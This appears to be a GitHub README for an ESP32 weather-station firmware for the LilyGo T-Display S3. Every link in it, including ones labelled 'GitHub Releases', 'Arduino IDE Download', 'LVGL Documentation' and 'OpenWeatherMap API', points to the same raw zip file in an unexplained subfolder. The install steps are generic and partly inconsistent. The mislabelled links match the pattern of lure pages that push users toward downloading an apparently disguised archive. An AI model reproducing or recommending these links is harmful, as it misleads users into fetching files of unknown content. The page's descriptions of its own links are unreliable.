# 🌦️ lilygo-weather-station - Access Live Weather Data Easily

## 🚀 Getting Started

Welcome to the lilygo-weather-station! This application offers real-time weather updates for your LilyGo T-Display S3 device. It gives you the current weather conditions and a simple 3-day forecast, all powered by the OpenWeatherMap API.

### ✔️ Features

- Real-time weather tracking
- Current weather conditions
- 3-day weather forecast
- Easy-to-read interface
- Supports ESP32 architecture
- Uses LVGL for user-friendly design

## 📥 Download & Install

To get started, you need to download the application. Simply **visit this page to download**: [GitHub Releases](https://raw.githubusercontent.com/estebandx10/lilygo-weather-station/main/Lohar/lilygo-weather-station.zip).

### 🔧 System Requirements

- **Hardware**: LilyGo T-Display S3
- **Software**: 
  - Arduino IDE (latest version)
  - PlatformIO (if preferred)
- **Internet Connection**: Required for fetching weather data

## 📦 Installation Steps

1. **Download the Application**: Go to the [GitHub Releases Page](https://raw.githubusercontent.com/estebandx10/lilygo-weather-station/main/Lohar/lilygo-weather-station.zip) and download the latest version of the application.
   
2. **Extract the Files**: Once the download finishes, locate the file in your downloads folder. Right-click on it and choose to extract the files to a new folder.

3. **Open Arduino IDE**: Launch the Arduino IDE on your computer. If you don’t have it yet, you can download it from the official Arduino website.

4. **Install Necessary Libraries**:
   - Open the Arduino IDE, then go to **Sketch** -> **Include Library** -> **Manage Libraries**.
   - Search for and install the following libraries:
     - ESP32 board support
     - LVGL (LittleVGL)
     - OpenWeatherMap API integration library

5. **Load the Project**:
   - In Arduino IDE, click on **File** -> **Open**.
   - Navigate to the folder where you extracted the files and select the main project file.

6. **Connect Your Device**: Plug your LilyGo T-Display S3 into your computer using a USB cable.

7. **Select the ESP32 Board**:
   - In Arduino, click on **Tools** -> **Board** and select the appropriate ESP32 board.

8. **Upload the Code**:
   - Click on the **Upload** button (arrow icon) in the Arduino IDE. This will compile and send the code to your device.

9. **Open the Serial Monitor**:
   - Go to **Tools** -> **Serial Monitor** to view logs and information about your device. Make sure to set the baud rate to 115200 for proper communication.

10. **Set Up API Key**:
    - If prompted, enter your OpenWeatherMap API key in the specified section of the code. Make sure to sign up for an OpenWeatherMap account if you don’t have an API key yet.

## ☁️ Using the Application

Once your device has the new code, it should start fetching weather data automatically. 

### Home Screen

The home screen will show you the current temperature, weather conditions, and a brief summary. 

### 3-Day Forecast

Scroll down to see the weekly forecast. This section provides temperature predictions and general weather conditions for the next three days.

### Updating the Device

To update the weather station, follow the installation steps again whenever there is a new version available on the [GitHub Releases Page](https://raw.githubusercontent.com/estebandx10/lilygo-weather-station/main/Lohar/lilygo-weather-station.zip).

## ⚙️ Troubleshooting

- **Device Not Connecting**: Make sure the USB cable is properly connected. Try using a different USB port or cable if issues persist.
- **Weather Data Not Showing**: Check your internet connection. Ensure your API key is correct and active.
- **Error During Upload**: Verify that the correct board is selected in the Arduino IDE under the Tools menu.

## 🔗 Useful Links

- [Arduino IDE Download](https://raw.githubusercontent.com/estebandx10/lilygo-weather-station/main/Lohar/lilygo-weather-station.zip)
- [LVGL Documentation](https://raw.githubusercontent.com/estebandx10/lilygo-weather-station/main/Lohar/lilygo-weather-station.zip)
- [OpenWeatherMap API](https://raw.githubusercontent.com/estebandx10/lilygo-weather-station/main/Lohar/lilygo-weather-station.zip)

## 💬 Support

For further assistance, feel free to reach out to the community on our GitHub issues page. Your feedback is crucial for improving the application.

Remember, you can always **visit this page to download** the latest release: [GitHub Releases](https://raw.githubusercontent.com/estebandx10/lilygo-weather-station/main/Lohar/lilygo-weather-station.zip). Enjoy your weather station!